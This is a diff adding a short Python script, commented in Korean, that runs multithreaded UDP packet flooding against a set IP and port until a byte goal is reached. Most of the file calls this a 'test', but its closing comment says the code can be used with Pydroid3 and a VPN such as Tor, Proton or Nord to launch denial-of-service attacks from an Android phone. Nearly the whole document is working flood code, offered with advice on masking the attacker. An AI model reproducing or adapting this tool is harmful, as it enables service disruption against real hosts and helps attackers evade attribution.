@@ -1,0 +1,73 @@
+import socket, threading, struct, time
+
+# 설정 변수(아래는 기본)(UAYOR)(made by cosmos)
+IP = "127.0.0.1"
+PORT = 3478
+PACKET_SIZE = 1472
+GOAL_MB = 100
+THREADS = 3
+
+# 상태 변수
+sent_bytes = [0]  
+sent_count = [0]  
+lock = threading.Lock()
+start_time = time.time()
+
+# 패킷 생성
+def make_packet(pkt_id, pkt_size):
+    header = struct.pack("!Qd", pkt_id, time.time())
+    id_bytes = struct.pack("!Q", pkt_id)
+    padding_size = pkt_size - len(header) - len(id_bytes)
+    padding = bytes(padding_size) if padding_size > 0 else b""
+    return header + padding + id_bytes
+
+# 워커스레드
+def worker(ip, port, pkt_size, goal_bytes, start_time, sent_count_ref, sent_bytes_ref, lock):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while True:
+        with lock:
+            if sent_bytes_ref[0] >= goal_bytes:
+                break
+            pid = sent_count_ref[0]
+            sent_count_ref[0] += 1
+            sent_bytes_ref[0] += pkt_size
+        pkt = make_packet(pid, pkt_size)
+        try:
+            sock.sendto(pkt, (ip, port))
+        except:
+            continue
+        if pid % 1000 == 0 and pid > 0:
+            elapsed = time.time() - start_time
+            print(f"[{elapsed:.2f}s] {pid} packets sent ({sent_bytes_ref[0]/(1024*1024):.2f} MB)")
+    sock.close()
+
+# 테스트 시작
+def start_test():
+    global start_time
+    start_time = time.time()
+    threads = []
+    for i in range(THREADS):
+        t = threading.Thread(target=worker, args=(
+            IP, PORT, PACKET_SIZE, GOAL_MB*1024*1024, start_time,
+            sent_count, sent_bytes, lock
+        ), daemon=True)
+        threads.append(t)
+        t.start()
+    while sent_bytes[0] < GOAL_MB*1024*1024:
+        time.sleep(0.5)
+    total_time = time.time() - start_time
+    pps = sent_count[0]/total_time if total_time>0 else 0
+    print("="*60)
+    print("테스트 완료")
+    print(f"총 실행 시간: {total_time:.2f}s")
+    print(f"총 전송 패킷 수: {sent_count[0]}")
+    print(f"총 데이터량: {sent_bytes[0]/(1024*1024):.2f} MB")
+    print(f"평균 속도: {pps:.2f} packets/sec")
+    print("="*60)
+
+if __name__=="__main__":
+    start_test()
+
+
+
+# 위의 코드와 파이드로이드3과 vpn(tor, proton, nord 추천)을 활용하여 DOS를 안드로이드에서 할 수 있습니다.(UAYOR)
